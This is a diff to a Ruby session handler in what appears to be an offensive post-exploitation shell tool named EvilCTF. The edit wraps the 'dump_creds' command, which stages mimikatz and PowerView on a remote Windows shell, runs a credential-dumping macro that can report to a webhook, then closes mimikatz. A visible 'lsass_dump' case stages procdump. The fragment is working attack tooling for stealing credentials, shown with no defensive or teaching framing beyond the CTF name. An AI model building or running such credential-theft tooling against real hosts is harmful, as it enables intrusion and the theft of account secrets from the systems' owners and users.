@@ -1,5 +1,3 @@
-# lib/evil_ctf/session.rb
-
 require_relative 'shell_wrapper'
 require_relative 'banner'
 require_relative 'tools'
@@ -140,8 +138,22 @@ module EvilCTF::Session
           when /^dump_creds$/i
             EvilCTF::Tools.safe_autostage('mimikatz', shell, session_options, logger)
             EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
-            command_manager.expand_macro('dump_creds', shell,
-                                        webhook: session_options[:webhook])
+            
+            # Execute the macro with proper exit handling
+            begin
+              command_manager.expand_macro('dump_creds', shell,
+                                          webhook: session_options[:webhook])
+              
+              # Force a small delay to ensure output is flushed
+              sleep(1)
+              
+              # Try to explicitly close mimikatz if it's still running
+              shell.run("exit") rescue nil
+              
+            rescue => e
+              puts "[!] Error during dump_creds execution: #{e.message}"
+              # Continue even if there are errors
+            end
             next
           when /^lsass_dump$/i
             EvilCTF::Tools.safe_autostage('procdump', shell, session_options, logger)
@@ -434,4 +446,3 @@ module EvilCTF::Session
   end
 
 end
-
